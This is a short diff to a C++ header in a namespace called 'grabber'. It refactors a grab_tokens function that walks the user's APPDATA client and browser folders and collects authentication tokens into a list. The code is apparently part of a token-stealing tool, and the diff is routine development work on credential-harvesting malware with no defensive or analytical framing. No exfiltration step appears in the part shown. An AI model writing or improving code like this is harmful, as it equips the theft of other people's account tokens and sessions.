@@ -1,6 +1,7 @@
 #pragma once
 
 #include <string>
+#include <vector>
 #if !_HAS_CXX17
 -> Please enable C++-17 <-
 #else
@@ -131,7 +132,7 @@ namespace grabber
 		return finds;
 	}
 
-	std::string grab_tokens(bool clients = true, bool browsers = false)
+	std::vector<std::string> grab_tokens(bool clients = true, bool browsers = false)
 	{
 		// Get Appdata paths
 		std::string roaming = util::env::get_env("APPDATA"); if (roaming.front() != '\\') roaming.push_back('\\');
@@ -167,21 +168,10 @@ namespace grabber
 		}
 
 		// Get tokens from each path
-		std::string tokens;
+		std::vector<std::string> tokens;
 		for (auto& path : paths)
-		{
 			if (util::fs::folder_exists(path.second))
-			{
-				// Extract tokens
-				std::vector<std::string> current_tokens{};
-				if (find_tokens_in_folder(path.second, current_tokens) > 0)
-				{
-					for (auto& token : current_tokens)
-						tokens += token + "\n";
-					tokens.pop_back();
-				}
-			}
-		}
+				find_tokens_in_folder(path.second, tokens); // Extract tokens
 
 		return tokens;
 	}
